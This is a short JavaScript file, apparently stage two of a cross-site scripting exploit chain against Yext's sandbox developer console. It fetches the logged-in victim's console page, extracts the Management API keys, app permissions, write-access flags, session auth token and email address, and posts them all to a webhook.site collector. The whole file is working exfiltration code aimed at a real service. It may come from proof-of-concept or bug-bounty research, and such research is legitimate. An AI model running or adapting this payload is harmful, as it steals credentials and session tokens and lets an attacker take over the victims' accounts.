// STAGE 2 - loaded into the sandbox.yext.com origin by the widget payload.
// Reads the victim's developer console and posts the Management API keys to the collector.
(function(){
  var WH="https://webhook.site/75488932-a110-4fa0-8c3d-fd6f4a3874e0";
  fetch("/s/2394434/developerconsole/",{credentials:"include"})
    .then(function(r){return r.text();})
    .then(function(t){
      var out={stage:"3_full_apikeys",origin:location.origin,
               delivery_url:location.href,page_bytes:t.length,apps:[],keys:[]};
      try{
        var m=t.match(/"appsJson":\s*"((?:[^"\\]|\\.)*)"/);
        var apps=JSON.parse(JSON.parse('"'+m[1]+'"')).apps;   // parse TWICE
        apps.forEach(function(a){
          var perms=[];
          (a.permissions||[]).forEach(function(p){
            (p.endpoints||[]).forEach(function(e){
              if(e.enabled) perms.push(p.apiGroupName+"/"+e.displayName);
            });
          });
          out.apps.push({id:a.id,name:a.name,apiKeys:a.apiKeys,
                         write:a.hasWriteAccess,perms:perms});
          (a.apiKeys||[]).forEach(function(k){out.keys.push(k);});
        });
        out.app_count=apps.length; out.key_count=out.keys.length;
        out.write_apps=out.apps.filter(function(a){return a.write;}).length;
      }catch(e){out.error=String(e);}
      // also grab the session auth token the dashboard prints into the DOM
      try{
        var d=new DOMParser().parseFromString(t,"text/html");
        var at=d.getElementById("js-storm-navigation-auth-token");
        var em=d.getElementById("js-storm-navigation-user-email");
        if(at) out.session_AT=at.value; if(em) out.victim_email=em.value;
      }catch(e){}
      fetch(WH+"?stage=3_full_apikeys&keys="+out.key_count+"&apps="+out.app_count,
            {method:"POST",headers:{"Content-Type":"text/plain"},
             body:JSON.stringify(out,null,1)});
    });
})();
